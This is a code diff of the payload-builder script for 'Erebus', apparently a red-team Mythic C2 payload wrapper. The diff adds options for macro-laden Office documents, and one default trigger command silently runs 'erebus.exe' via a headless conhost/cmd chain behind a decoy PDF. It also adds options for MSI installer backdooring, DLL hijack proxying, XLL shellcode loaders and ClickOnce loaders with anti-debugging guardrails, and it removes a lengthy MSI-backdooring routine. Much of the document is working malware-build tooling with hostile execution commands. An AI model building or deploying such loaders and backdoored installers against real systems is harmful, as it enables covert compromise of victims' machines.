@@ -168,6 +168,7 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             default_value = "exe",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
             ]
         ),
 
@@ -199,6 +200,17 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
             description = "Select the loader's build config.",
             choices = ["debug", "release"],
             default_value = "debug",
+            hide_conditions = [
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "0.3a ClickOnce Architecture",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = "Select the target architecture for the ClickOnce loader",
+            choices = ["x64", "x86"],
+            default_value = "x64",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
             ]
@@ -529,6 +541,32 @@ appdomain (self)""",
         ),
 
         BuildParameter(
+            name="0.9f1 MalDoc Trigger Binary",
+            parameter_type=BuildParameterType.String,
+            description="Executable to run when the VBA trigger fires (Command Execution mode only).",
+            default_value="C:\\Windows\\System32\\conhost.exe",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.NotEQ, value="Command Execution"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9f2 MalDoc Trigger Command",
+            parameter_type=BuildParameterType.String,
+            description="Arguments passed to the trigger binary (Command Execution mode only).",
+            default_value="--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.NotEQ, value="Command Execution"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
+            ]
+        ),
+
+        BuildParameter(
             name="0.9g VBA Loader Technique",
             parameter_type=BuildParameterType.ChooseOne,
             description="VBA shellcode loader technique - VirtualAlloc (classic), EnumLocales (callback), QueueUserAPC (APC), ProcessHollowing (remote)",
@@ -652,6 +690,24 @@ appdomain (self)""",
         ),
 
         BuildParameter(
+            name="0.9p MalDoc Output Format",
+            parameter_type=BuildParameterType.ChooseOne,
+            description=(
+                "Output format for the VBA maldoc. "
+                "xlsm: macro-enabled workbook (Linux ZIP injection, immediate). "
+                "xlsx/xlam: requires erebus_helper on a Windows host (deferred via build_maldoc.bat)."
+            ),
+            choices=["xlsm", "xlsx", "xlam"],
+            default_value="xlsm",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
+                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.NotEQ, value="VBA Macro"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
+            ]
+        ),
+
+        BuildParameter(
             name = "0.13 Decoy File Inclusion",
             parameter_type = BuildParameterType.Boolean,
             description = "Check whether you want the decoy file in the final payload or not",
@@ -690,6 +746,17 @@ NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded
             description = "Select the target architecture for the DLL loader",
             choices = ["x64", "x86"],
             default_value = "x64",
+            hide_conditions = [
+                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
+            ]
+        ),
+
+        BuildParameter(
+            name = "1.0b Hijack Build Configuration",
+            parameter_type = BuildParameterType.ChooseOne,
+            description = "Select the build configuration for the DLL hijack payload",
+            choices = ["release", "debug"],
+            default_value = "release",
             hide_conditions = [
                 HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
             ]
@@ -999,17 +1066,29 @@ generated if none have been entered.""",
                 HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
             ]
         ),
+
         BuildParameter(
-            name="5.3 MSI Backdoor File",
+            name="5.3 Enable MSI Backdoor",
+            parameter_type=BuildParameterType.Boolean,
+            description="Enable backdoor functionality for MSI installer",
+            default_value=False,
+            required=False,
+            hide_conditions=[
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI")
+            ]
+        ),
+        BuildParameter(
+            name="5.4 MSI Backdoor File",
             parameter_type=BuildParameterType.File,
             description="Backdoor an existing MSI installer by injecting payload execution",
             required=False,
             hide_conditions=[
-                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
+                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
             ]
         ),
         BuildParameter(
-            name="5.4 MSI Attack Type",
+            name="5.5 MSI Attack Type",
             parameter_type=BuildParameterType.ChooseOne,
             description="""Attack vector for MSI backdoor injection:
 - execute: Run command via CustomAction (stealthiest)
@@ -1020,56 +1099,61 @@ generated if none have been entered.""",
             choices=["execute", "run-exe", "load-dll", "dotnet", "script"],
             default_value="execute",
             hide_conditions=[
-                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
-                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value="")
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
+                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
+                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
             ]
         ),
         BuildParameter(
-            name="5.5 MSI Entry Point",
+            name="5.6 MSI Entry Point",
             parameter_type=BuildParameterType.String,
             description="DLL export function or script function name (required for load-dll/dotnet/script attacks)",
             default_value="",
             required=False,
             hide_conditions=[
-                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
-                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
-                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.EQ, value="execute"),
-                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.EQ, value="run-exe")
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
+                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
+                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.EQ, value="execute"),
+                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.EQ, value="run-exe"),
+                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
             ]
         ),
         BuildParameter(
-            name="5.6 MSI Command Arguments",
+            name="5.7 MSI Command Arguments",
             parameter_type=BuildParameterType.String,
             description="Command line arguments for execute/run-exe attacks",
             default_value="",
             required=False,
             hide_conditions=[
-                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
-                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
-                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.NotEQ, value="execute"),
-                HideCondition(name="5.4 MSI Attack Type", operand=HideConditionOperand.NotEQ, value="run-exe")
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
+                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
+                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.NotEQ, value="execute"),
+                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.NotEQ, value="run-exe"),
+                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
             ]
         ),
         BuildParameter(
-            name="5.7 MSI Execution Condition",
+            name="5.8 MSI Execution Condition",
             parameter_type=BuildParameterType.String,
             description="MSI condition for payload execution (default: NOT REMOVE = run on install only)",
             default_value="NOT REMOVE",
             required=False,
             hide_conditions=[
-                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
-                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value="")
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
+                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
+                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
             ]
         ),
         BuildParameter(
-            name="5.8 MSI Custom Action Name",
+            name="5.9 MSI Custom Action Name",
             parameter_type=BuildParameterType.String,
             description="Custom action name (leave empty for random generation)",
             default_value="",
             required=False,
             hide_conditions=[
-                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI"),
-                HideCondition(name="5.3 MSI Backdoor File", operand=HideConditionOperand.EQ, value="")
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
+                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
+                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
             ]
         ),
         #Codesigning
@@ -1174,11 +1258,11 @@ generated if none have been entered.""",
         BuildStep(step_name = "[T1553.006] - Sign Shellcode Loader",
             step_description = "Signing the Shellcode Loader with a code signing certificate"),
 
-        BuildStep(step_name = "[T1218.007] - Backdooring MSI",
-                  step_description = "Injecting payload into existing MSI installer"),
-
         BuildStep(step_name = "[T1137.006] - Adding Trigger",
                   step_description = "Creating trigger to execute given payload"),
+
+        BuildStep(step_name = "[T1218.007] - Staging MSI",
+                  step_description = "Staging uploaded MSI for backdoor injection"),
 
         BuildStep(step_name = "[T1036.008] - Creating Decoy",
                   step_description= "Creating a placeholder decoy file"),
@@ -1266,174 +1350,55 @@ generated if none have been entered.""",
                 obfuscated = re.sub(rf'\b{original}\b', replacement, obfuscated, flags=re.IGNORECASE)
             return obfuscated
 
-    async def backdoor_msi_payload(self, agent_build_path):
-        """Backdoors an uploaded MSI installer with the generated payload and places it in the payload directory
 
-        Enhanced with support for multiple attack vectors:
-        - execute: Direct command execution
-        - run-exe: Binary extraction and execution
-        - load-dll: DLL loading with custom entry points
-        - dotnet: .NET assembly loading
-        - script: VBScript/JScript execution
+    def _bundle_helper_as_single_file(self, helper_src: Path, output_path: Path) -> None:
+        """Merge all Erebus.Helper module sources into a single standalone Python script.
 
-        Uses Erebus.Helper on Windows or falls back to container MSI plugin on Linux.
+        The resulting file has no relative imports and can be run directly as
+        ``python erebus_helper.py <command>`` on a Windows host, or compiled
+        into a single exe via ``pyinstaller --onefile erebus_helper.py``.
         """
-        msi_backdoor_uuid = self.get_parameter("5.3 MSI Backdoor File")
-        if not msi_backdoor_uuid:
-            return  # No MSI to backdoor
+        module_order = ["compile_xll", "trigger_lnk", "container_msi"]
+        # Relative-import lines produced by __init__.py – strip them from main.py
+        strip_prefixes = ("from modules.", "from .compile_xll", "from .trigger_lnk", "from .container_msi")
 
-        try:
-            # Download the uploaded MSI file
-            file_resp = await SendMythicRPCFileGetContent(
-                MythicRPCFileGetContentMessage(AgentFileId=msi_backdoor_uuid)
+        sections: list[str] = []
+
+        # 1. One shared header with all stdlib imports so duplicates collapse naturally
+        sections.append(
+            "#!/usr/bin/env python3\n"
+            "# erebus_helper.py – auto-generated single-file bundle\n"
+            "# Run: python erebus_helper.py <command> [options]\n"
+            "# Or compile: pyinstaller --onefile erebus_helper.py\n"
+        )
+
+        # 2. Emit each module body, stripping its module-level docstring marker and
+        #    any intra-package imports so nothing references 'modules.*'
+        for mod_name in module_order:
+            mod_path = helper_src / "modules" / f"{mod_name}.py"
+            if not mod_path.exists():
+                continue
+            src = mod_path.read_text(encoding="utf-8")
+            # Drop lines that are relative imports (they'll be inlined here)
+            filtered = "\n".join(
+                line for line in src.splitlines()
+                if not any(line.startswith(p) for p in strip_prefixes)
             )
+            sections.append(f"\n# {'='*72}\n# Module: {mod_name}\n# {'='*72}\n")
+            sections.append(filtered)
 
-            # Save the MSI to a temporary location
-            temp_dir = Path(tempfile.gettempdir())
-            source_msi_path = temp_dir / f"source_{msi_backdoor_uuid}.msi"
-            source_msi_path.write_bytes(file_resp.Content)
-            await SendMythicRPCPayloadUpdatebuildStep(
-                MythicRPCPayloadUpdateBuildStepMessage(
-                PayloadUUID=self.uuid,
-                StepName="[T1218.007] - Backdooring MSI",
-                StepStdout="Downloading uploaded MSI installer...",
-                StepSuccess=True,
-            ))
+        # 3. Emit main.py, dropping only the 'from modules.*' import lines
+        main_path = helper_src / "main.py"
+        main_src = main_path.read_text(encoding="utf-8")
+        filtered_main = "\n".join(
+            line for line in main_src.splitlines()
+            if not any(line.startswith(p) for p in strip_prefixes)
+        )
+        sections.append(f"\n# {'='*72}\n# main\n# {'='*72}\n")
+        sections.append(filtered_main)
 
-            # Get attack parameters
-            attack_type = self.get_parameter("5.4 MSI Attack Type")
-            entry_point = self.get_parameter("5.5 MSI Entry Point")
-            command_args = self.get_parameter("5.6 MSI Command Arguments")
-            condition = self.get_parameter("5.7 MSI Execution Condition")
-            custom_action_name = self.get_parameter("5.8 MSI Custom Action Name")
-
-            # Generate random name if not provided
-            if not custom_action_name:
-                custom_action_name = ''.join(__import__('random').choices(__import__('string').ascii_letters, k=8))
-
-            await SendMythicRPCPayloadUpdatebuildStep(
-                MythicRPCPayloadUpdateBuildStepMessage(
-                PayloadUUID=self.uuid,
-                StepName="[T1218.007] - Backdooring MSI",
-                StepStdout=f"Injecting payload into MSI installer (attack: {attack_type})...",
-                StepSuccess=True,
-            ))
-
-            # Get the payload path
-            payload_dir = Path(agent_build_path) / "payload"
-            payload_file = None
-
-            # Determine payload file based on attack type
-            if attack_type in ["load-dll", "dotnet"]:
-                # Look for DLL
-                try:
-                    payload_file = next(p for p in payload_dir.iterdir()
-                                      if p.is_file() and p.suffix.lower() == ".dll")
-                except StopIteration:
-                    # Fallback to EXE if no DLL found
-                    try:
-                        payload_file = next(p for p in payload_dir.iterdir()
-                                          if p.is_file() and p.suffix.lower() == ".exe")
-                    except StopIteration:
-                        raise RuntimeError("No DLL or EXE payload found for MSI backdooring!")
-
-            elif attack_type == "script":
-                # Look for script files
-                try:
-                    payload_file = next(p for p in payload_dir.iterdir()
-                                      if p.is_file() and p.suffix.lower() in [".vbs",
-                                                                              ".js", ".vbe", ".jse"])
-                except StopIteration:
-                    raise RuntimeError("No script file (.vbs/.js) found for script attack!")
-
-            else:  # execute, run-exe
-                # Look for EXE
-                try:
-                    payload_file = next(p for p in payload_dir.iterdir()
-                                      if p.is_file() and p.suffix.lower() == ".exe")
-                except StopIteration:
-                    raise RuntimeError("No .exe payload found in payload directory for MSI backdooring!")
-
-            # Validate entry point for attacks that require it
-            if attack_type in ["load-dll", "dotnet", "script"] and not entry_point:
-                if attack_type == "script":
-                    raise RuntimeError(f"Entry point (function name) is required for {attack_type} attack")
-                else:
-                    # Use default for DLL
-                    entry_point = "DllEntry"
-
-            # Try using Erebus.Helper on Windows first
-            backdoored_msi_path = None
-            try:
-                from erebus_wrapper.agent_code.Erebus.Helper.main import MSIHelper
-
-                # Use helper for MSI backdooring
-                msi_helper = MSIHelper()
-                final_msi_path = payload_dir / f"{source_msi_path.stem}-backdoored.msi"
-
-                success = msi_helper.backdoor_msi(
-                    source_msi=str(source_msi_path),
-                    payload_path=str(payload_file),
-                    output_path=str(final_msi_path),
-                    attack_type=attack_type,
-                    entry_point=entry_point,
-                    command_args=command_args,
-                    custom_action_name=custom_action_name,
-                    condition=condition
-                )
-
-                if success and final_msi_path.exists():
-                    backdoored_msi_path = final_msi_path
-                    output_method = "Erebus.Helper"
-                else:
-                    raise RuntimeError("MSI helper returned failure status")
-
-            except ImportError:
-                # Fallback to container MSI plugin on Linux
-                output_method = "Container MSI Plugin"
-
-                # Call hijack_msi with advanced parameters
-                backdoored_msi_path = hijack_msi(
-                    source_msi=source_msi_path,
-                    payload_path=payload_file,
-                    build_path=Path(agent_build_path),
-                    custom_action_name=custom_action_name,
-                    attack_type=attack_type,
-                    entry_point=entry_point,
-                    command_args=command_args,
-                    condition=condition
-                )
-
-                # Copy the patched MSI into the payload directory
-                final_msi_path = payload_dir / f"{source_msi_path.stem}-patched.msi"
-                shutil.copy2(backdoored_msi_path, final_msi_path)
-
-            # Build success message with attack details
-            success_msg = f"Successfully backdoored MSI: {final_msi_path.name}\n"
-            success_msg += f"Attack Type: {attack_type}\n"
-            success_msg += f"Custom Action: {custom_action_name}\n"
-            if entry_point:
-                success_msg += f"Entry Point: {entry_point}\n"
-            if command_args:
-                success_msg += f"Arguments: {command_args}\n"
-            success_msg += f"Condition: {condition}"
-
-            await SendMythicRPCPayloadUpdatebuildStep(
-                MythicRPCPayloadUpdateBuildStepMessage(
-                PayloadUUID=self.uuid,
-                StepName="[T1218.007] - Backdooring MSI",
-                StepStdout=success_msg,
-            ))
-
-        except Exception as e:
-            await SendMythicRPCPayloadUpdatebuildStep(
-                MythicRPCPayloadUpdateBuildStepMessage(
-                PayloadUUID=self.uuid,
-                StepName="[T1218.007] - Backdooring MSI",
-                StepStdout=f"Failed to backdoor MSI: {str(e)}",
-                StepSuccess=False,
-            ))
-            raise RuntimeError(f"MSI backdooring failed: {str(e)}")
+        output_path.parent.mkdir(parents=True, exist_ok=True)
+        output_path.write_text("\n".join(sections), encoding="utf-8")
 
     async def containerise_payload(self,agent_build_path):
         """Creates a container and adds all files generated from the payload function inside of the given archive/media"""
@@ -1811,7 +1776,7 @@ generated if none have been entered.""",
             payload_type = self.get_parameter("0.0 Main Payload Type")
             dll_file_name = None  # Used to store DLL filename for final payload naming
             print(f'User Selected: {payload_type}')
-            
+
             if payload_type == "Hijack":
                 # [DLL HIJACK SPECIFIC] Get the DLL target file from Mythic
                 file_content = await getFileFromMythic(
@@ -1825,6 +1790,8 @@ generated if none have been entered.""",
                 dll_file_name = ""
                 if file_name_resp.Success and len(file_name_resp.Files) > 0:
                     dll_file_name = file_name_resp.Files[0].Filename
+                if not dll_file_name:
+                    dll_file_name = f"{self.get_parameter('1.0 DLL Hijacking')}.dll"
 
                 with open(dll_target_path, "wb") as file:
                     file.write(file_content)
@@ -1852,8 +1819,16 @@ generated if none have been entered.""",
                         StepSuccess=False,
                     ))
                     return response
-                
+
                 shutil.copy(src=dll_exports_path, dst=loader_exports_path)
+
+                # Copy the original DLL into the payload directory as <name>_orig.dll
+                # so the forwarder chain resolves correctly at runtime
+                orig_dll_name = f"{Path(dll_file_name).stem}_orig{Path(dll_file_name).suffix}"
+                orig_dll_path = Path(agent_build_path) / "payload" / orig_dll_name
+                with open(str(orig_dll_path), "wb") as f:
+                    f.write(file_content)
+
                 response.status = BuildStatus.Success
                 response.build_message = "DLL Proxied! Compiling Payload..."
                 await SendMythicRPCPayloadUpdatebuildStep(
@@ -1866,7 +1841,7 @@ generated if none have been entered.""",
 
             elif payload_type == "Loader":
                 loader_type = self.get_parameter("0.1 Loader Type")
-                
+
                 if loader_type == "Shellcode Loader":
                     shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin",
                                 src=obfuscated_shellcode_path)
@@ -1986,13 +1961,13 @@ generated if none have been entered.""",
                         injection_config_template = environment.get_template("InjectionConfig.cs")
                         compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                         encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
-                        
+
                         # Helper function to convert array to C# string format
                         def array_to_csharp_string(lst):
                             if not lst or len(lst) == 0:
                                 return ""
                             return ", ".join(f'"{item}"' for item in lst)
-                        
+
                         # Guardrails configuration for ClickOnce
                         guardrails_enabled = 1 if self.get_parameter("0.5a Enable Guardrails") else 0
                         guardrails_check_debugger = 1 if self.get_parameter("0.5b Check IsDebuggerPresent") else 0
@@ -2058,6 +2033,7 @@ generated if none have been entered.""",
                 guardrail_template = environment.get_template("guardrail.hpp")
                 guardrails_enabled = self.get_parameter("1.1 Use Built-in Guardrails")
                 guardrail_data = {
+                    "use_builtin_guardrails": guardrails_enabled,
                     "check_debugger": self.get_parameter("1.1a Check IsDebuggerPresent") if guardrails_enabled else False,
                     "check_remote_debugger": self.get_parameter("1.1b Check Remote Debugger") if guardrails_enabled else False,
                     "check_debugger_processes": self.get_parameter("1.1c Check Debugger Processes") if guardrails_enabled else False,
@@ -2071,7 +2047,7 @@ generated if none have been entered.""",
                     "allowed_domains": parse_csv(self.get_parameter("1.1k Domain Whitelist")) if guardrails_enabled else [],
                 }
                 guardrail_output = guardrail_template.render(**guardrail_data)
-                guardrail_hpp_path = PurePath(agent_build_path) / "templates" / "guardrail.hpp"
+                guardrail_hpp_path = PurePath(shellcode_loader_path) / "include" / "guardrail.hpp"
                 with open(str(guardrail_hpp_path), "w") as file:
                     file.write(guardrail_output)
 
@@ -2081,7 +2057,7 @@ generated if none have been entered.""",
                     "-C",
                     shellcode_loader_path,
                     f"ARCH={self.get_parameter('1.0a Hijack Loader Architecture')}",
-                    f"BUILD={self.get_parameter('0.3 Loader Build Configuration')}",
+                    f"BUILD={self.get_parameter('1.0b Hijack Build Configuration')}",
                     "TARGET=dll",
                     "all"
                 ]
@@ -2092,12 +2068,13 @@ generated if none have been entered.""",
 
             elif payload_type == "Loader":
                 loader_type = self.get_parameter("0.1 Loader Type")
-                
+
                 if loader_type == "Shellcode Loader":
                     # Configure guardrails for Shellcode Loader
                     guardrail_template = environment.get_template("guardrail.hpp")
                     guardrails_enabled = self.get_parameter("0.5a Enable Guardrails")
                     guardrail_data = {
+                        "use_builtin_guardrails": guardrails_enabled,
                         "check_debugger": self.get_parameter("0.5b Check IsDebuggerPresent") if guardrails_enabled else False,
                         "check_remote_debugger": self.get_parameter("0.5c Check Remote Debugger") if guardrails_enabled else False,
                         "check_debugger_processes": self.get_parameter("0.5d Check Debugger Processes") if guardrails_enabled else False,
@@ -2116,7 +2093,7 @@ generated if none have been entered.""",
                         file.write(guardrail_output)
 
                     build_config = self.get_parameter('0.3 Loader Build Configuration')
-                    
+
                     # Handle test build configuration
                     if build_config == "test":
                         cmd = [
@@ -2131,23 +2108,29 @@ generated if none have been entered.""",
                         payload_output_file = f"{shellcode_loader_path}/payloads"
                         payload_final_name = "test_payloads.zip"
                     else:
+                        loader_format = self.get_parameter('0.2 Loader Format')
                         cmd = [
                             "make",
                             "-C",
                             shellcode_loader_path,
                             f"ARCH={self.get_parameter('0.2a Loader Architecture')}",
-                            f"TARGET={self.get_parameter('0.2 Loader Format')}",
+                            f"TARGET={loader_format}",
                             f"BUILD={build_config}",
                             "all"
                         ]
-                        compile_step_name = "[T1027] - Compiling Shellcode Loader"
-                        compile_step_msg = "Shellcode Loader Compiled!"
-                        payload_output_file = f"{shellcode_loader_path}/erebus.{self.get_parameter('0.2 Loader Format')}"
-                        payload_final_name = f"erebus.{self.get_parameter('0.2 Loader Format')}"
+                        if loader_format == "dll":
+                            compile_step_name = "[T1027.011] - Compiling DLL Payload"
+                            compile_step_msg = "DLL Loader Compiled!"
+                        else:
+                            compile_step_name = "[T1027] - Compiling Shellcode Loader"
+                            compile_step_msg = "Shellcode Loader Compiled!"
+                        payload_output_file = f"{shellcode_loader_path}/erebus.{loader_format}"
+                        payload_final_name = f"erebus.{loader_format}"
 
                 elif loader_type == "ClickOnce":
                     build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
-                    rid = self.get_parameter('0.4 ClickOnce RID') or "win-x64"
+                    arch = self.get_parameter('0.3a ClickOnce Architecture') or "x64"
+                    rid = f"win-{arch}"
 
                     cmd = [
                         "make",
@@ -2208,21 +2191,21 @@ generated if none have been entered.""",
 
             elif payload_type == "Loader":
                 loader_type = self.get_parameter("0.1 Loader Type")
-                
+
                 if loader_type == "Shellcode Loader":
                     build_config = self.get_parameter('0.3 Loader Build Configuration')
-                    
+
                     # Handle test build - create zip of all test payloads
                     if build_config == "test":
                         payloads_dir = Path(payload_output_file)  # payload_output_file contains path to payloads directory
-                        
+
                         output += f"[DEBUG] Payloads directory: {payloads_dir}\n"
                         output += f"[DEBUG] Payloads directory exists: {payloads_dir.exists()}\n"
-                        
+
                         if payloads_dir.exists():
                             files_in_dir = list(payloads_dir.iterdir())
                             output += f"[DEBUG] Files in payloads directory: {[f.name for f in files_in_dir]}\n"
-                        
+
                         if not payloads_dir.exists() or not any(payloads_dir.iterdir()):
                             response.status = BuildStatus.Error
                             response.build_message = "Failed to compile test payloads"
@@ -2235,15 +2218,15 @@ generated if none have been entered.""",
                                 StepSuccess=False,
                             ))
                             return response
-                        
+
                         # Create agent_code/payloads directory for persistent storage
                         agent_code_payloads_dir = Path(__file__).resolve().parent.parent / "agent_code" / "payloads"
                         agent_code_payloads_dir.mkdir(parents=True, exist_ok=True)
-                        
+
                         # Create zip file using shutil
                         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                         zip_basename = f"test_payloads_{timestamp}"
-                        
+
                         # Use shutil.make_archive to create zip (it adds .zip automatically)
                         # This creates the zip in the parent directory of payloads_dir
                         zip_archive_path = shutil.make_archive(
@@ -2252,25 +2235,25 @@ generated if none have been entered.""",
                             root_dir=str(payloads_dir.parent),
                             base_dir=payloads_dir.name
                         )
-                        
+
                         output += f"[DEBUG] Created archive at: {zip_archive_path}\n"
                         output += f"[DEBUG] Archive size: {os.path.getsize(zip_archive_path)} bytes\n"
-                        
+
                         # Move the zip to agent_code/payloads
                         final_zip_path = agent_code_payloads_dir / f"{zip_basename}.zip"
                         shutil.move(zip_archive_path, str(final_zip_path))
-                        
+
                         output += f"[DEBUG] Moved archive to: {final_zip_path}\n"
-                        
+
                         # Also copy individual payloads to agent_code/payloads for easy access
                         files_copied = 0
                         for file in payloads_dir.iterdir():
                             if file.is_file():
                                 shutil.copy(file, agent_code_payloads_dir / file.name)
                                 files_copied += 1
-                        
+
                         output += f"[DEBUG] Copied {files_copied} individual files\n"
-                        
+
                         if os.path.exists(final_zip_path) and os.path.getsize(final_zip_path) > 0:
                             response.status = BuildStatus.Success
                             response.build_message = f"Test payloads compiled and saved to agent_code/payloads/!"
@@ -2282,12 +2265,12 @@ generated if none have been entered.""",
                                 StepStdout=f"{compile_step_msg} Saved {files_copied} payloads to {agent_code_payloads_dir}",
                                 StepSuccess=True,
                             ))
-                            
+
                             # For test builds, read the zip and return it as the payload
                             with open(final_zip_path, "rb") as f:
                                 response.payload = f.read()
                             response.updated_filename = f"{zip_basename}.zip"
-                            
+
                             # Return early for test builds - skip containerization and other steps
                             return response
                         else:
@@ -2375,30 +2358,25 @@ generated if none have been entered.""",
                         ))
                         return response
 
-                    # Copy cleaned artifacts from publish directory
+                    # Copy cleaned artifacts from publish directory (skip the main exe - renamed below)
                     payload_dir = Path(agent_build_path) / "payload"
                     payload_dir.mkdir(parents=True, exist_ok=True)
 
+                    CLICKONCE_MAIN = {"Erebus.ClickOnce.exe", "Erebus.ClickOnce.dll"}
                     for item in publish_dir.iterdir():
-                        if item.is_file():
+                        if item.is_file() and item.name not in CLICKONCE_MAIN:
                             dest_path = payload_dir / item.name
                             shutil.copy2(str(item), str(dest_path))
-                            try:
-                                import ctypes
-                                FILE_ATTRIBUTE_HIDDEN = 0x02
-                                ctypes.windll.kernel32.SetFileAttributesW(str(dest_path), FILE_ATTRIBUTE_HIDDEN)
-                            except:
-                                pass
 
                     output += f"[DEBUG] Cleaned publish artifacts:\n"
                     for item in publish_dir.iterdir():
                         if item.is_file():
                             output += f"  - {item.name} ({item.stat().st_size} bytes)\n"
 
-                    # Locate and copy main executable
+                    # Locate main executable and copy as erebus.exe / erebus.dll
                     payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                     payload_path = str(payload_path)
-                    
+
                     clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
                     clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"
 
@@ -2598,8 +2576,8 @@ generated if none have been entered.""",
                     # Generate VBA payload code based on injection type
                     if injection_type == "Command Execution":
                         # Use WScript.Shell to execute trigger binary and command
-                        trigger_binary = self.get_parameter("0.9a Trigger Binary")
-                        trigger_command = self.get_parameter("0.9b Trigger Command")
+                        trigger_binary = self.get_parameter("0.9f1 MalDoc Trigger Binary")
+                        trigger_command = self.get_parameter("0.9f2 MalDoc Trigger Command")
 
                         # Import the plugin function to generate command execution VBA
                         from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
@@ -2859,209 +2837,32 @@ static size_t key_len = sizeof(key);
                         output += f"[+] Generated xll_config.h\n"
 
                         try:
-                            try:
-                                from erebus_wrapper.erebus_wrapper.agent_code.Erebus.Helper.main import WindowsCompiler
+                            xll_output_path = payload_dir / f"{doc_name}.xll"
+                            xll_source_ref = payload_dir / f"{doc_name}.cpp"
 
-                                # Set up architecture based on build parameters
-                                xll_architecture = "x64" # Could be parameterized if needed
+                            # XLL compilation requires MSVC on a Windows host via erebus_helper.
+                            # Docker only ships the source; build_xll.bat handles compilation.
+                            shutil.copy(str(xll_source_path), str(xll_source_ref))
+                            output += f"[*] Source code saved to: {xll_source_ref.name}\n"
 
-                                compiler = WindowsCompiler(
-                                    compiler=xll_compiler,
-                                    architecture=xll_architecture,
-                                    optimization='Ox',
-                                    verbose=True
-                                )
+                            # Copy header files so cl.exe can find them alongside the .cpp
+                            shutil.copy(str(xll_inject_path), str(payload_dir / "xll_inject.h"))
+                            shutil.copy(str(xll_shellcode_path), str(payload_dir / "xll_shellcode.h"))
